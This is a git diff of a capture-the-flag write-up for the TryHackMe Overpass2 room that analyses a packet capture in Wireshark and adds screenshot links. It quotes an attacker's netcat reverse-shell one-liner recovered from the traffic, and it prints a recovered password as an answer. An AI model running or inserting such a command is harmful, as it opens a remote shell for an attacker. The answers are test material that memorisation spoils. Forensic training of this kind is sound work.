@@ -20,6 +20,8 @@ Right click on the first packet --> Select Follow --> TCP Stream
 ```
 Right click on the second packet --> Select Follow --> TCP Stream 
 ```
+[Overpass2_3](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_3.png) , [Overpass2_4](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_4.png)
+
 **Answer**
 ###### exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")
 
@@ -31,11 +33,13 @@ Now let's use another method. We search in the entire capture the keyword : *pas
 For that: 
 ```
     - click on the search icon --> select Packet bytes
-    - *Don't check Case sensitive*
+    - Don't check Case sensitive
     - Select String
     - indicate the string you want to find: password
 ```
 When you found the packet, Right click --> Select Follow --> TCP Stream
+
+[Overpass2_5](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_5.png) , [Overpass2_6](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_6.png)
 
 **Answer**
 ######  whenevernoteartinstant
